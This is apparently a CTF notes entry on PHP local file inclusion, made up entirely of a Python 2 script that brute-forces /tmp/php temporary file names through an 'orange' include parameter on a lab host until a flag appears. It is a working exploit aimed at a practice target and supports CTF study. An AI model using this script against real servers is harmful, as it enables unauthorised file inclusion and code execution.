# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/文件包含.md
# TITLE: 正文
# CATEGORY: web

#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import string

charset = string.digits + string.letters

host = "192.168.1.9"
port = 8000
base_url = "http://%s:%d" % (host, port)


def brute_force_tmp_files():
    for i in charset:
        for j in charset:
            for k in charset:
                for l in charset:
                    for m in charset:
                        for n in charset:
                            filename = i + j + k + l + m + n
                            url = "%s/index.php?orange=/tmp/php%s" % (
                                base_url, filename)
                            print url
                            try:
                                response = requests.get(url)
                                if 'flag' in response.content:
                                    print "[+] Include success!"
                                    return True
                            except Exception as e:
                                print e
    return False

def main():
    brute_force_tmp_files()

if __name__ == "__main__":
    main()
